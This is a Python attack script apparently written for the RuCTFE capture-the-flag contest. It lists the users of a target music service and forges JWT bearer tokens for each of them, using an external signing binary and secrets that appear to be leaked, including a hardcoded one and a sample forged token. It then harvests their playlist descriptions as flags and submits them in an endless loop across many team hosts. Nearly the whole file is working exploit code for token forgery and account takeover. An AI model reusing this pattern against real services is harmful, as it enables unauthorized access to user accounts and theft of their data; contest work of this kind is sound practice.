import requests
import json
import subprocess
import sys
import time


def list_users(target):
    url = f"{target}/frontend-api/our-users/"
    print(url)
    resp = requests.get(url)
    return resp.json()

def list_playlists(target, token):
    # print(token)
    headers = {'Authorization': 'Bearer {}'.format(token)}
    url = f"{target}/api/v1/playlist/"
    resp = requests.get(url, headers=headers)    
    return resp.json()

def get_playlist(target, token, pid):
    headers = {'Authorization': 'Bearer {}'.format(token)}
    url = f"{target}/api/v1/playlist/{pid}/"
    resp = requests.get(url, headers=headers)
    return resp.json()

def get_track(target, token, tid):
    headers = {'Authorization': 'Bearer {}'.format(token)}
    url = f"{target}/api/v1/track/{tid}/"
    resp = requests.get(url, headers=headers)
    # print(resp.text)
    return resp.json()

def get_token(secret, username):
    res = subprocess.run(["./sign", secret, username], stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
    # print(res)
    return res.stderr.decode("utf-8").strip()    

def submit_flags(flags):    
    headers = { 'X-Team-Token': 'nej' }
    resp = requests.put("http://monitor.ructfe.org/flags", headers=headers, json=flags)     
    print(resp.json())


# target = "http://10.61.119.2:4553" # ours
# target = "http://10.61.192.2:4553" # other team
# secret = "ed8b44a64e66e1a68ff3c48907862e37c420b5cf297f6c48fa0b54900f61353b" # "1574507219"/secrets/jwt_secret
target = "http://10.61.103.2:4553"
secret = "aae5177e07c3472942ad9839ee2e799929e4b39a47b5d9792977d597aafc63bb"


def pwn(target, secret):
    users = list_users(target)
    # print(users)

    potential_flags = []
    for user in users[-20:]:
        # user = "NNGEICAUDDSWCSMNLVDKXNUYSVRWD"
        # token = "eyJhbGciOiI0MiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiTk5HRUlDQVVERFNXQ1NNTkxWREtYTlVZU1ZSV0QifQ.3OVsajAAa4NHNvUieJWnOVjTlwoNssgb+ty1LyXI0uIwbKDbRCkEVMMZp8rHDHvekYRP+TT8Pm+Cewj/TSg5PvIrTw7dwvsTyB6uqNr78mCnEoZpDQLvtyoSjBiD76uskl3Xz/neoZrUzTkG+cxcV9YkgdnqaXoPV8MKFO3Ut+0=" #get_token(user)
        token = get_token(secret, user) 
        if token == "":
            print("token is empty.")
            sys.exit(1)
        # print(token)
        lists = list_playlists(target, token)
        # print(lists)
        print()
        print(user)
        print("Found " + str(len(lists)) + " lists")
        for l in lists:
            print(l["CreatedAt"], l["description"])
            if l["description"].endswith("="):
                potential_flags.append(l["description"])
            
    submit_flags(potential_flags)

if __name__ == "__main__":
    secretslist = sys.argv[1]

    with open(secretslist) as fp:
        secrets = fp.readlines()
    
    while True:
        for secret in secrets:
            secret = secret.strip()
            try:
                parts = secret.split(",")
                pwn(f"http://{parts[0]}", parts[1])
            except Exception as ex:
                print(ex)
        time.sleep(60)
        


            

    


